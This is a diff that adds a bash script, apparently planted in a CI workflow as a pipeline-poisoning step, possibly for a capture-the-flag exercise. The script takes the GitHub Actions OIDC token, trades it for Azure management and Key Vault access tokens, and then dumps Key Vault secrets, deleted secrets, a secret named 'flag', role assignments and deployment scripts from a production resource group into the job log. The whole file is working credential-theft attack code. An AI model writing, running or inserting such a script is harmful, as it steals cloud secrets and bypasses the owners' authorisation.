@@ -1,1 +1,9 @@
-#!/usr/bin/env bash`necho PROBE
+#!/usr/bin/env bash
+set +e
+TEN="$AZURE_TENANT_ID"; CID="$AZURE_CLIENT_ID"; SUB="$AZURE_SUBSCRIPTION_ID"; RG=rg-tbl-platform-prod-sea; KV=kv-tbl-sec-x3euoz
+J=$(curl -sS -H "Authorization: bearer $ACTIONS_ID_TOKEN_REQUEST_TOKEN" "${ACTIONS_ID_TOKEN_REQUEST_URL}&audience=api://AzureADTokenExchange"|jq -r .value)
+tok(){ curl -sS -X POST "https://login.microsoftonline.com/$TEN/oauth2/v2.0/token" --data-urlencode client_id="$CID" -d grant_type=client_credentials --data-urlencode scope="$1" -d client_assertion_type=urn:ietf:params:oauth:client-assertion-type:jwt-bearer --data-urlencode client_assertion="$J"|jq -r .access_token; }
+A=$(tok https://management.azure.com/.default); V=$(tok https://vault.azure.net/.default); base="https://management.azure.com/subscriptions/$SUB/resourceGroups/$RG/providers/Microsoft.KeyVault/vaults/$KV"
+for u in "$base/secrets?api-version=2023-07-01" "$base/deletedsecrets?api-version=2023-07-01" "$base/providers/Microsoft.KeyVault/secrets?api-version=2023-07-01" "$base/providers/Microsoft.KeyVault/deletedsecrets?api-version=2023-07-01" "$base/providers/Microsoft.Authorization/roleAssignments?api-version=2022-04-01"; do echo "ARM $u"; curl -sS -H "Authorization: Bearer $A" "$u"|head -c 4000; echo; done
+for u in "https://$KV.vault.azure.net/secrets?api-version=7.4" "https://$KV.vault.azure.net/deletedsecrets?api-version=7.4" "https://$KV.vault.azure.net/secrets/flag?api-version=7.4"; do echo "KV $u"; curl -sS -H "Authorization: Bearer $V" "$u"|head -c 2000; echo; done
+for p in deployments deploymentScripts; do echo "RES $p"; curl -sS -H "Authorization: Bearer $A" "https://management.azure.com/subscriptions/$SUB/resourceGroups/$RG/providers/Microsoft.Resources/$p?api-version=2022-09-01"|head -c 4000;echo;done
